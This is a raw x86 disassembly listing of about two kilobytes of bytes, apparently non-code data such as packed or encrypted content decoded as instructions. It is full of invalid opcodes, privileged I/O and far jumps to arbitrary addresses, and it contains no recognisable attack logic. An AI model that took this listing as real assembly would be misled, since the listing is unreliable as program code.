  4218ca:	jnp    0x421875
  4218cc:	jmp    0xaaf698c5
  4218d1:	and    BYTE PTR [eax],ah
  4218d3:	daa    
  4218d4:	outs   dx,DWORD PTR ds:[esi]
  4218d5:	push   edx
  4218d6:	sbb    al,0xa4
  4218d8:	popa   
  4218d9:	jo     0x4218a5
  4218db:	out    dx,eax
  4218dc:	jmp    0x9caca7bd
  4218e1:	and    DWORD PTR [ebx],eax
  4218e3:	push   es
  4218e4:	or     eax,0xe9a82fc9
  4218e9:	(bad)  
  4218ea:	jmp    FWORD PTR [edx+0x11dcb6bf]
  4218f0:	push   cs
  4218f1:	push   ecx
  4218f2:	mov    bh,0xb1
  4218f4:	mov    eax,edx
  4218f6:	lea    esp,[edx-0xc]
  4218f9:	aam    0xd5
  4218fb:	xchg   ebp,eax
  4218fc:	test   eax,0x4ad9a33e
  421901:	or     ah,bh
  421903:	dec    esp
  421904:	fwait
  421905:	sbb    al,0x9e
  421907:	imul   ecx,DWORD PTR [edx],0x89edb651
  42190d:	adc    ch,BYTE PTR [ebx-0x12]
  421910:	jmp    0x123d91b2
  421915:	and    DWORD PTR [eax-0x9],0x1ae23e88
  42191c:	jge    0x42195e
  42191e:	adc    al,0xd2
  421920:	mov    ebx,0x3bec241c
  421925:	sbb    al,0x21
  421927:	cmp    al,0x67
  421929:	adc    edi,DWORD PTR [edi]
  42192b:	out    dx,eax
  42192c:	pop    ebx
  42192d:	dec    eax
  42192e:	into   
  42192f:	fdiv   st(6),st
  421931:	inc    ecx
  421933:	and    BYTE PTR [edi],ch
  421935:	sbb    al,0xcd
  421937:	sbb    eax,0x47274910
  42193c:	cmp    eax,0x6989a30a
  421941:	fnstsw WORD PTR [ebx+0x21aa6664]
  421947:	mov    WORD PTR [ebx],ds
  421949:	adc    eax,0x7330073b
  42194e:	lods   al,BYTE PTR ds:[esi]
  42194f:	mov    WORD PTR [edi-0x2a27ed43],ss
  421955:	mov    bh,0x4c
  421957:	in     al,0x29
  421959:	icebp  
  42195a:	xor    DWORD PTR [edi+0x43],esi
  42195d:	repnz push esi
  42195f:	xchg   esp,eax
  421960:	add    bh,BYTE PTR [edx]
  421962:	dec    esp
  421963:	fnsave [esi-0x4125297e]
  421969:	ss in  al,0x20
  42196c:	or     eax,0xdff86234
  421971:	les    esp,FWORD PTR [ebp+0x78ac3010]
  421977:	pop    edx
  421978:	mov    al,0xe7
  42197a:	mov    ds:0xb51e9d70,eax
  42197f:	mov    al,0xbd
  421981:	(bad)  
  421982:	aad    0xc1
  421984:	stc    
  421985:	stc    
  421986:	mov    cl,0x9
  421988:	or     eax,0x7136fd4
  42198d:	fstp   TBYTE PTR [edx]
  42198f:	add    BYTE PTR ss:[eax],al
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	mov    ds:0x24f96126,al
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    al,0x1
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	lock dec ebx
  421a0e:	mov    edi,0x2bffd716
  421a13:	jae    0x4219a3
  421a15:	sbb    esp,DWORD PTR [ebx]
  421a17:	les    esi,FWORD PTR [edi+0x4e101f78]
  421a1d:	outs   dx,BYTE PTR ds:[esi]
  421a1e:	int3   
  421a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a20:	sub    DWORD PTR [edi+0x798187ab],ebp
  421a26:	dec    ebp
  421a27:	xchg   esp,eax
  421a28:	out    dx,eax
  421a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a2b:	adc    ch,BYTE PTR [ecx-0x1f127c2f]
  421a31:	and    eax,0x41bb11fc
  421a36:	pusha  
  421a37:	mov    DWORD PTR [eax+0x49],edx
  421a3a:	std    
  421a3b:	or     al,0xd2
  421a3d:	add    BYTE PTR [edi],al
  421a3f:	sbb    BYTE PTR [ebp-0x2c0fa1c],0xda
  421a46:	sbb    dl,BYTE PTR [ecx]
  421a48:	mov    ?,WORD PTR [ebx]
  421a4a:	(bad)  
  421a4b:	push   esp
  421a4c:	data16 jg 0x421a8f
  421a4f:	add    ah,BYTE PTR [ebx+0x70]
  421a52:	fdiv   DWORD PTR [edx-0x56]
  421a55:	jno    0x421a70
  421a57:	js     0x421a96
  421a59:	fnstcw WORD PTR [ebx-0x2c2c2367]
  421a5f:	inc    ebx
  421a60:	mov    ah,0x54
  421a62:	add    BYTE PTR [ebx-0x25],0x12
  421a66:	jg     0x421abc
  421a68:	push   esp
  421a69:	sub    al,0x87
  421a6b:	add    al,0x53
  421a6d:	jnp    0x421a1c
  421a6f:	adc    DWORD PTR [ebx],0x9c41347b
  421a75:	jnp    0x421a7a
  421a77:	pop    ebp
  421a78:	mov    al,0x7c
  421a7a:	(bad)  
  421a7b:	jbe    0x421a8b
  421a7d:	retf   0x9333
  421a80:	add    al,0x24
  421a82:	pop    es
  421a83:	pushf  
  421a84:	jl     0x421aaf
  421a86:	cmp    ah,BYTE PTR [ecx+0x2d]
  421a89:	sahf   
  421a8a:	loop   0x421b06
  421a8c:	jmp    0xabb585b3
  421a91:	pop    esp
  421a92:	jge    0x421a94
  421a94:	sbb    edi,DWORD PTR [ecx+edx*8+0x27]
  421a98:	jg     0x421ac3
  421a9a:	nop
  421a9b:	ret    
  421a9c:	imul   esi,DWORD PTR [edi],0xd2c911da
  421aa2:	shr    DWORD PTR [edx-0x58],0x7
  421aa6:	bound  esp,QWORD PTR [esi]
  421aa8:	retf   
  421aa9:	vpaddusb ymm3,ymm3,YMMWORD PTR [eax]
  421aad:	mul    BYTE PTR [ebx+edi*4]
  421ab0:	xchg   BYTE PTR [eax],bh
  421ab2:	shr    edi,1
  421ab4:	in     eax,0x73
  421ab6:	out    0x4d,al
  421ab8:	pushf  
  421ab9:	out    dx,eax
  421aba:	jmp    0x6033:0x241e1732
  421ac1:	and    edi,DWORD PTR [ebp+eiz*8-0x45]
  421ac5:	jmp    0x4a785fe9
  421aca:	icebp  
  421acb:	mov    ah,0x43
  421acd:	add    DWORD PTR [edi+0x1c],esp
  421ad0:	pop    ebp
  421ad1:	cmp    dh,BYTE PTR [eax+0x54]
  421ad4:	shl    DWORD PTR [ebx-0x1aef6047],1
  421ada:	sbb    eax,0xd190f524
  421adf:	and    eax,0x5a599a0a
  421ae4:	mov    ch,0xf7
  421ae6:	jge    0x421b01
  421ae8:	adc    al,0xf6
  421aea:	lock lods eax,DWORD PTR ds:[esi]
  421aec:	aas    
  421aed:	clc    
  421aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aef:	push   0xbaa73cd3
  421af4:	sbb    BYTE PTR [edi+0x5e],cl
  421af7:	fsubp  st(1),st
  421af9:	mov    bh,0x25
  421afb:	mov    BYTE PTR [edi],cl
  421afd:	int    0x18
  421aff:	inc    edx
  421b00:	jp     0x421b37
  421b02:	push   0x70
  421b04:	push   ds
  421b05:	dec    ebx
  421b06:	pop    esi
  421b07:	(bad)  
  421b08:	loope  0x421b74
  421b0a:	retf   0x7720
  421b0d:	maskmovq mm1,(bad)
  421b0e:	test   DWORD PTR [ebp+0x0],0x0
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     al,BYTE PTR [ebp-0x6f]
  421b82:	cmp    DWORD PTR [eax+0x16728],edi
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	push   esp
  421b8d:	jecxz  0x421bd3
  421b8f:	add    BYTE PTR [edi+0x28],ah
  421b92:	mov    BYTE PTR [ebx],0xd9
  421b95:	(bad)  
  421b96:	and    BYTE PTR [eax],ah
  421b98:	jmp    0xdefe5b26
  421b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b9e:	fstp   DWORD PTR [edx]
  421ba0:	xchg   ebp,eax
  421ba1:	mov    ds:0x8ccfaf5d,al
  421ba6:	inc    ebx
  421ba7:	jne    0x421b53
  421ba9:	pusha  
  421baa:	lea    ebp,[ebp+0x7aef0fb]
  421bb0:	pop    ecx
  421bb1:	mov    DWORD PTR [edx],esi
  421bb3:	sub    al,BYTE PTR [edx]
  421bb5:	out    0x66,eax
  421bb7:	jmp    0x9069:0x98d012cf
  421bbe:	data16 out dx,al
  421bc0:	push   ebp
  421bc1:	xchg   ebx,eax
  421bc2:	add    BYTE PTR [eax-0x42],cl
  421bc5:	and    ebx,DWORD PTR [ebx-0x3eee22c8]
  421bcb:	or     eax,0xe664b47
  421bd0:	mov    dl,0x76
  421bd2:	fisubr DWORD PTR [ecx+0x2f084c0c]
  421bd8:	sbb    esp,DWORD PTR [edx]
  421bda:	inc    ebp
  421bdb:	lea    ecx,[esi+0x3b73449b]
  421be1:	dec    edx
  421be2:	xor    ebp,esp
  421be4:	sti    
  421be5:	fsub   DWORD PTR [ebp-0x61]
  421be8:	mov    edx,fs
  421bea:	inc    esp
  421beb:	inc    ecx
  421bec:	(bad)  
  421bee:	pop    ecx
  421bef:	into   
  421bf0:	aaa    
  421bf1:	adc    BYTE PTR [ebx-0x36],dh
  421bf4:	xchg   DWORD PTR [esi+edi*2+0x5048179e],eax
  421bfb:	inc    ecx
  421bfc:	adc    ch,ah
  421bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bff:	pop    ds
  421c00:	cs es push edx
  421c03:	adc    al,0xac
  421c05:	dec    ecx
  421c06:	call   0x5099cb37
  421c0b:	xor    DWORD PTR [ebx-0x5853b625],edx
  421c11:	and    esp,DWORD PTR [ebx-0x1ac08e8d]
  421c17:	sahf   
  421c18:	mov    al,0xe3
  421c1a:	lods   eax,DWORD PTR ds:[esi]
  421c1b:	ja     0x421c5d
  421c1d:	retf   0xcc60
  421c20:	stos   DWORD PTR es:[edi],eax
  421c21:	or     DWORD PTR [edi+esi*4],edx
  421c24:	push   edi
  421c25:	mov    ?,eax
  421c27:	cld    
  421c28:	xchg   ebx,eax
  421c29:	sub    esp,esi
  421c2b:	lahf   
  421c2c:	pop    ds
  421c2d:	xchg   edx,eax
  421c2e:	push   0x1c
  421c30:	and    BYTE PTR [ecx],dl
  421c32:	push   0xffffffde
  421c34:	inc    ecx
  421c35:	xor    bl,BYTE PTR [edx+0x521c6b26]
  421c3b:	mov    al,ds:0x718b11a5
  421c40:	add    DWORD PTR [ecx+0x2d170ccf],ebp
  421c46:	daa    
  421c47:	mov    dh,0xf1
  421c49:	push   edi
  421c4a:	or     al,0xf5
  421c4c:	mov    ebp,0x5b31ae1c
  421c51:	dec    eax
  421c52:	inc    ebp
  421c53:	cmc    
  421c54:	aaa    
  421c55:	inc    ebx
  421c56:	cwde   
  421c57:	mov    es,edi
  421c59:	leave  
  421c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c5b:	fisttp QWORD PTR [ecx+ebx*1]
  421c5e:	cmp    dl,BYTE PTR [ebx+0xdc45af3]
  421c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c65:	hlt    
  421c66:	clc    
  421c67:	js     0x421c6c
  421c69:	ja     0x421ce5
  421c6b:	gs leave 
  421c6d:	std    
  421c6e:	iret   
  421c6f:	out    dx,eax
  421c70:	mov    ebx,0x85e61dbc
  421c75:	inc    esi
  421c76:	mov    dh,0xd6
  421c78:	mov    dh,0xcb
  421c7a:	xor    BYTE PTR [edx+0x5c],al
  421c7d:	(bad)  [eax+0x1728d56d]
  421c83:	xchg   ebp,eax
  421c84:	dec    eax
  421c85:	cmp    DWORD PTR ds:0xaad3df96,ebp
  421c8b:	jmp    0x421cff
  421c8d:	pop    ds
  421c8e:	jge    0x421c89
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	jle    0x421d53
  421d02:	call   FWORD PTR [esp+ebp*1+0x4000168]
  421d09:	add    DWORD PTR [eax],eax
  421d0b:	add    BYTE PTR [eax],dl
  421d0d:	jp     0x421cc3
  421d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d10:	inc    edi
  421d11:	inc    edx
  421d12:	fld    QWORD PTR [eax+ebp*2-0x4f229298]
  421d19:	jl     0x421d30
  421d1b:	in     al,dx
  421d1c:	jns    0x421cad
  421d1e:	mov    dl,0x72
  421d20:	imul   eax,DWORD PTR [ecx],0x8d735b60
  421d26:	jo     0x421ce8
  421d28:	stc    
  421d29:	test   eax,0x3e95f4ef
  421d2e:	(bad)  
  421d2f:	inc    esi
  421d30:	jmp    0x57a5:0x3b2d141a
  421d37:	push   0xffffffec
  421d39:	sub    edi,ecx
  421d3b:	outs   dx,BYTE PTR ds:[esi]
  421d3c:	iret   
  421d3d:	inc    ecx
  421d3e:	mov    ds:0x331f8ca,eax
  421d43:	iret   
  421d44:	pop    esp
  421d45:	mov    ch,0x83
  421d47:	mov    DWORD PTR [ebx+0x4b],edi
  421d4a:	cwde   
  421d4b:	inc    esi
  421d4c:	or     al,cl
  421d4e:	jb     0x421daf
  421d50:	add    al,0xca
  421d52:	and    al,0xd8
  421d54:	ds das 
  421d56:	cli    
  421d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d58:	ror    DWORD PTR [edi+0x5b],cl
  421d5b:	out    dx,eax
  421d5c:	jbe    0x421da5
  421d5e:	int    0xdd
  421d60:	rol    BYTE PTR [ebx-0xe2c7a0f],1
  421d66:	jbe    0x421d5d
  421d68:	test   eax,0x692e2d1b
  421d6d:	sub    DWORD PTR [ecx],esi
  421d6f:	adc    BYTE PTR [eax+ebp*2-0x5d],bh
  421d73:	sbb    cl,BYTE PTR [esi]
  421d75:	adc    edx,ecx
  421d77:	xchg   ebx,eax
  421d78:	into   
  421d79:	inc    DWORD PTR [edx]
  421d7b:	or     dh,BYTE PTR [ecx]
  421d7d:	nop
  421d7e:	aad    0xe8
  421d80:	and    BYTE PTR [ebx-0x6126b16f],ah
  421d86:	pop    ss
  421d87:	xor    eax,0x3a6eca85
  421d8c:	mov    DWORD PTR ss:[ebx],esi
  421d8f:	cmp    al,0x2b
  421d91:	scas   eax,DWORD PTR es:[edi]
  421d92:	ins    BYTE PTR es:[edi],dx
  421d93:	ss push edx
  421d95:	mul    DWORD PTR [edx]
  421d97:	pop    ebx
  421d98:	dec    ebp
  421d99:	les    ebx,FWORD PTR [esp+eax*1-0x9]
  421d9d:	aad    0x24
  421d9f:	sub    ecx,DWORD PTR [edi+edi*1-0x2a07710]
  421da6:	rcr    dl,1
  421da8:	jg     0x421de9
  421daa:	jnp    0x421df8
  421dac:	loop   0x421d67
  421dae:	lock (bad) 
  421db0:	mov    al,BYTE PTR [edx+0x3faf1b73]
  421db6:	fld    DWORD PTR [edx]
  421db8:	or     DWORD PTR [eax],eax
  421dba:	lods   al,BYTE PTR ds:[esi]
  421dbb:	inc    esi
  421dbc:	(bad)  
  421dbd:	into   
  421dbe:	push   cs
  421dbf:	mov    WORD PTR [esi+eax*4-0x47],ds
  421dc3:	(bad)  
  421dc4:	push   ebx
  421dc5:	ds loopne 0x421e29
  421dc8:	rcr    BYTE PTR [esi+0x23629777],0x4e
  421dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dd0:	sbb    ecx,DWORD PTR [esi+0x4e653fb9]
  421dd6:	jmp    0xa5e:0xc1835977
  421ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dde:	rcl    DWORD PTR [bp+si-0x37],1
  421de2:	pop    ss
  421de3:	push   ebp
  421de4:	jno    0x421e28
  421de6:	mov    ch,0xdd
  421de8:	and    dl,BYTE PTR [ebx+0x46309068]
  421dee:	dec    edx
  421def:	lods   al,BYTE PTR ds:[esi]
  421df0:	mov    al,ds:0xe9912a15
  421df5:	(bad)  
  421df6:	xor    BYTE PTR [esi],ch
  421df8:	daa    
  421df9:	cwde   
  421dfa:	jp     0x421df9
  421dfc:	pop    esi
  421dfd:	out    0xfb,eax
  421dff:	push   0xe6d27479
  421e04:	jp     0x421dd5
  421e06:	push   edi
  421e07:	or     al,0xda
  421e09:	jmp    0x9db9:0xe17a3f64
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	call   0x169:0x30ae0f31
  421e87:	add    BYTE PTR [ecx+eax*1],al
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	dec    ebp
  421e8d:	mov    dl,0x26
  421e8f:	dec    edx
  421e90:	push   0xffffffc8
  421e92:	xor    cl,0x5c
  421e95:	outs   dx,DWORD PTR ds:[esi]
  421e96:	in     al,dx
  421e97:	push   esp
  421e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e99:	es dec edx
  421e9b:	popa   
  421e9c:	xchg   edi,eax
  421e9d:	fiadd  WORD PTR [edx-0x49]
  421ea0:	mov    esi,0xe49e3e54
  421ea5:	pop    ecx
  421ea6:	sti    
  421ea7:	call   0xc9ee9400
  421eac:	cmc    
  421ead:	stos   DWORD PTR es:[edi],eax
  421eae:	test   al,0xd0
  421eb0:	(bad)  
  421eb1:	cmp    BYTE PTR [ecx],al
  421eb3:	lods   al,BYTE PTR ds:[esi]
  421eb4:	call   0x8e96:0xdf908ca9
  421ebb:	dec    edx
  421ebc:	lods   al,BYTE PTR ds:[esi]
  421ebd:	cmp    ebx,DWORD PTR [ebx]
  421ebf:	ins    DWORD PTR es:[edi],dx
  421ec0:	pop    edi
  421ec1:	push   es
  421ec2:	stos   BYTE PTR es:[edi],al
  421ec3:	scas   al,BYTE PTR es:[edi]
  421ec4:	not    DWORD PTR [esi+edi*1-0x23]
  421ec8:	cmp    edi,ebx
  421eca:	cli    
  421ecb:	in     al,0xbd
  421ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ece:	cmc    
  421ecf:	add    eax,0x40183c37
  421ed4:	retf   0xa56c
  421ed7:	ret    
  421ed8:	add    esp,esi
  421eda:	pop    ecx
  421edb:	out    0xb7,eax
  421edd:	cmp    al,0x46
  421edf:	cmp    al,0xc4
  421ee1:	sbb    eax,0x1bb83c77
  421ee6:	aaa    
  421ee7:	aas    
  421ee8:	mov    dl,0x74
  421eea:	scas   al,BYTE PTR es:[edi]
  421eeb:	hlt    
  421eec:	add    BYTE PTR [ebp-0x57949f0b],0xd3
  421ef3:	js     0x421f68
  421ef5:	int3   
  421ef6:	cld    
  421ef7:	mov    al,ds:0x114b35b5
  421efc:	dec    edi
  421efd:	out    dx,al
  421efe:	mov    eax,ds:0x54def27a
  421f03:	sbb    esp,DWORD PTR [eax+0x2d]
  421f06:	mov    eax,0xa4fa4b3f
  421f0b:	and    al,0x6d
  421f0d:	mov    ebx,0x73e03b8b
  421f12:	jmp    0x421f2e
  421f14:	out    0x5c,al
  421f16:	(bad)  
  421f17:	adc    dl,cl
  421f19:	in     eax,0x57
  421f1b:	bound  edx,QWORD PTR [eax]
  421f1d:	lods   al,BYTE PTR ds:[esi]
  421f1e:	test   DWORD PTR [edx],esp
  421f20:	inc    edi
  421f21:	loope  0x421f6d
  421f23:	es jmp 0x3c4e73b1
  421f29:	add    al,0xa0
  421f2b:	xchg   edx,eax
  421f2c:	jae    0x421eb2
  421f2e:	fwait
  421f2f:	adc    al,0xa
  421f31:	into   
  421f32:	shl    DWORD PTR [esi+0x13ad3f87],cl
  421f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f39:	dec    eax
  421f3a:	jb     0x421f42
  421f3c:	into   
  421f3d:	out    dx,al
  421f3e:	jno    0x421eeb
  421f40:	rcl    BYTE PTR [edx],cl
  421f42:	mov    WORD PTR [eax+ebp*2],?
  421f45:	cld    
  421f46:	cld    
  421f47:	call   0x896e:0xd6660f5
  421f4e:	fld    TBYTE PTR [esi+0x2fefddde]
  421f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f55:	(bad)  
  421f57:	(bad)  
  421f59:	inc    esi
  421f5a:	inc    esi
  421f5b:	stos   DWORD PTR es:[edi],eax
  421f5c:	ins    BYTE PTR es:[edi],dx
  421f5d:	pop    ecx
  421f5e:	sbb    DWORD PTR [ebx-0x64],ebx
  421f61:	test   DWORD PTR [ecx],ecx
  421f63:	cli    
  421f64:	xchg   ch,bl
  421f66:	adc    ch,0xeb
  421f69:	pop    ds
  421f6a:	or     DWORD PTR [edx+0x526e9b82],edi
  421f70:	hlt    
  421f71:	into   
  421f72:	clc    
  421f73:	rcr    DWORD PTR [edi+0xa],0xcb
  421f77:	jb     0x421f42
  421f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f7a:	sub    edi,DWORD PTR [eax+0x74]
  421f7d:	jne    0x421fef
  421f7f:	and    BYTE PTR [edx-0x36],0xc1
  421f83:	loope  0x421f11
  421f85:	ret    0x6547
  421f88:	xchg   esi,eax
  421f89:	mov    al,0x49
  421f8b:	or     dh,BYTE PTR [ecx]
  421f8d:	xor    ch,cl
  421f8f:	pop    DWORD PTR [eax]
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 jbe 0x422074
  422002:	pop    ecx
  422003:	dec    edi
  422004:	xor    al,0x6a
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42200d:	lock imul eax,DWORD PTR [edi+edi*2+0x62],0xffffffd5
  422013:	jecxz  0x421fcb
  422015:	shl    BYTE PTR [edx],1
  422017:	(bad)  
  422018:	shl    BYTE PTR [ebx-0x6c95a082],1
  42201e:	std    
  42201f:	jnp    0x422064
  422021:	stos   BYTE PTR es:[edi],al
  422022:	int    0x5d
  422024:	popa   
  422025:	inc    esp
  422026:	popa   
  422027:	pop    ecx
  422028:	fnsave [ebx-0x11]
  42202b:	or     cl,al
  42202d:	sbb    eax,0x506ba550
  422032:	inc    eax
  422033:	stos   BYTE PTR es:[edi],al
  422034:	mov    ds:0x14aec876,eax
  422039:	mov    esp,0x3ee884e9
  42203e:	stos   DWORD PTR es:[edi],eax
  42203f:	or     eax,0x7a5273c7
  422044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422045:	sub    bh,BYTE PTR [ebx-0x4b]
  422048:	xchg   edx,eax
  422049:	sbb    ch,BYTE PTR [ebx-0x4b8c0205]
  42204f:	int3   
  422050:	jg     0x4220b8
  422052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422053:	dec    ebp
  422054:	mov    eax,ds:0x3e6e6d17
  422059:	clc    
  42205a:	pop    es
  42205b:	in     al,0x4f
  42205d:	jnp    0x4220a4
  42205f:	mov    ds:0x24f7d949,al
  422064:	rcl    ah,1
  422066:	mul    DWORD PTR [edx-0x78]
  422069:	sub    DWORD PTR ds:0xb10ce28c,esp
  42206f:	fld    DWORD PTR [edi+0x39]
  422072:	popf   
  422073:	das    
  422074:	inc    ebx
  422075:	ret    
  422076:	or     al,0x5f
  422078:	ja     0x42201d
  42207a:	or     DWORD PTR [ebp+0x64],edi
  42207d:	fisubr WORD PTR fs:[edi+0x64142567]
  422084:	jmp    0x8b1f:0x19eb9cdd
  42208b:	pop    ss
  42208c:	sbb    eax,eax
  42208e:	loopne 0x422037
  422090:	sub    esp,DWORD PTR [ebp-0x3f9974b2]
  422096:	aam    0xc8
  422098:	xchg   esi,eax
  422099:	cmc    
  42209a:	sub    dl,BYTE PTR [ecx]
  42209c:	hlt    
  42209d:	dec    ebx
  42209e:	ror    DWORD PTR [ebx+0x60],0xe5
  4220a2:	pop    esi
  4220a3:	inc    edi
  4220a4:	and    BYTE PTR [eax],0x30
  4220a7:	pop    edi
  4220a8:	mov    edx,0xf8c63153
  4220ad:	mov    dl,0x63
  4220af:	mov    esp,esi
  4220b1:	mov    BYTE PTR [edi],dh
  4220b3:	fwait
  4220b4:	pop    ebx
  4220b5:	xchg   esp,eax
  4220b6:	int    0xf5
  4220b8:	mov    ecx,DWORD PTR [ebx+edi*2]
  4220bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220bc:	dec    edi
  4220bd:	dec    ebp
  4220be:	outs   dx,BYTE PTR ds:[esi]
  4220bf:	xor    esi,DWORD PTR [edi]
  4220c1:	mov    BYTE PTR [edx],dl
  4220c3:	sub    DWORD PTR [edi],edx
  4220c5:	nop
  4220c6:	mov    bh,0xbf
  4220c8:	ret    
  4220c9:	(bad)  
  4220ca:	push   ss
  4220cb:	stos   BYTE PTR es:[edi],al
  4220cc:	sbb    DWORD PTR [ebx-0x7d9fe4e6],ebx
  4220d2:	pusha  
  4220d3:	adc    al,BYTE PTR [ecx+0x2eaac10f]
  4220d9:	stos   DWORD PTR es:[edi],eax
  4220da:	pop    edi
  4220db:	shl    DWORD PTR [edi],0x7d
  4220de:	xchg   esp,eax
  4220df:	scas   eax,DWORD PTR es:[edi]
  4220e0:	fadd   QWORD PTR [ecx]
  4220e2:	jmp    0x422075
  4220e4:	shr    DWORD PTR [ebx],cl
  4220e6:	out    dx,eax
  4220e7:	pop    esi
  4220e8:	xor    eax,0xe3922714
  4220ed:	mov    ah,0x1a
  4220ef:	cmc    
  4220f0:	dec    edx
  4220f1:	cmp    BYTE PTR [ebx-0x78],bl
  4220f4:	mov    bh,0x8e
  4220f6:	(bad)  
  4220f7:	aam    0xbb
  4220f9:	mov    bl,0xe4
  4220fb:	icebp  
  4220fc:	push   ds
  4220fd:	repz mov edi,0x141ec812
  422103:	cs or  al,ah
  422106:	lock push esi
  422108:	test   eax,0x2534c5a7
  42210d:	lods   al,BYTE PTR ds:[esi]
  42210e:	in     al,dx
  42210f:	and    eax,0x0
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ebx,esp
  422181:	cmp    eax,0x6b38c40f
  422186:	add    DWORD PTR [eax],eax
  422188:	add    al,0x1
  42218a:	add    BYTE PTR [eax],al
  42218c:	ins    DWORD PTR es:[edi],dx
  42218d:	imul   esp,DWORD PTR [edi+0x34],0x4b48124a
  422194:	ins    DWORD PTR es:[edi],dx
  422195:	push   DWORD PTR [edi]
  422197:	in     eax,dx
  422198:	mov    bl,BYTE PTR [edi]
  42219a:	loopne 0x4221e0
  42219c:	nop
  42219d:	jbe    0x4221f6
  42219f:	pop    ds
  4221a0:	mov    ah,0x39
  4221a2:	out    0x9d,al
  4221a4:	inc    ebp
  4221a5:	stc    
  4221a6:	sbb    DWORD PTR ds:0xe9f673d,0x5510e839
  4221b0:	mov    ch,0x8f
  4221b2:	pop    ss
  4221b3:	lea    eax,[edi]
  4221b5:	cmp    al,0x8a
  4221b7:	mov    ebp,0xf2db80b3
  4221bc:	jp     0x4221b9
  4221be:	(bad)  
  4221bf:	mov    cl,0xa8
  4221c1:	cmp    DWORD PTR [ebp-0x604c9489],edx
  4221c7:	mov    ecx,ebp
  4221c9:	mov    bh,0x91
  4221cb:	add    ch,bh
  4221cd:	loopne 0x4221da
  4221cf:	push   edi
  4221d0:	retf   
  4221d1:	jmp    0x7f029485
  4221d6:	and    eax,0x7d173139
  4221db:	(bad)  
  4221dc:	fcomp  DWORD PTR [esi+eax*1-0x33ca7903]
  4221e3:	icebp  
  4221e4:	jbe    0x4221e1
  4221e6:	sbb    esi,DWORD PTR [ecx+0x23]
  4221e9:	sub    eax,0x5cdcf58a
  4221ee:	daa    
  4221ef:	in     al,0xe
  4221f1:	jns    0x422258
  4221f3:	idiv   dh
  4221f5:	cmp    eax,DWORD PTR ds:0x9f0e6803
  4221fb:	retf   
  4221fc:	sub    dh,al
  4221fe:	in     eax,dx
  4221ff:	cmp    DWORD PTR [ebp+0x55],edx
  422202:	pop    ds
  422203:	jno    0x42223e
  422205:	ret    0x70d
  422208:	call   0xa799:0x4a539048
  42220f:	out    0xf1,eax
  422211:	outs   dx,BYTE PTR ds:[esi]
  422212:	mov    ebx,0x4a00f361
  422217:	cmp    BYTE PTR es:[esi-0x62fd7c98],bh
  42221e:	and    DWORD PTR [ebx+0x40],esi
  422221:	sbb    al,BYTE PTR [edi-0x3a]
  422224:	xchg   edi,eax
  422225:	test   al,0xf7
  422227:	in     al,dx
  422228:	retf   
  422229:	xor    BYTE PTR [edi],ch
  42222b:	mov    ah,0xe2
  42222d:	sub    DWORD PTR [ecx-0x33073113],0xffffffc1
  422234:	or     al,0xaa
  422236:	sub    al,0xc
  422238:	mov    esp,0x5f18043a
  42223d:	sub    esi,DWORD PTR [edx+0x6b048095]
  422243:	add    eax,0x15813e4f
  422248:	add    eax,0x251510c3
  42224d:	jne    0x4222a4
  42224f:	dec    edx
  422250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422251:	pop    ecx
  422252:	aad    0x4e
